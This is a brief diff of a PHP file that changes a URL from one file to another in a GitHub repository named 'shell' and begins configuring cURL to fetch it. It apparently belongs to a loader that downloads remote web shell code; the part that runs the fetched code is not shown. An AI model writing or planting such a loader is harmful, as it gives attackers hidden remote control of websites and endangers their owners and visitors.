@@ -1,5 +1,5 @@
 <?php
-$url = "https://raw.githubusercontent.com/Zeddgansz/shell/main/edit-link.php";
+$url = "https://raw.githubusercontent.com/Zeddgansz/shell/main/dom.php";
 
 $options = [
     CURLOPT_RETURNTRANSFER => true,
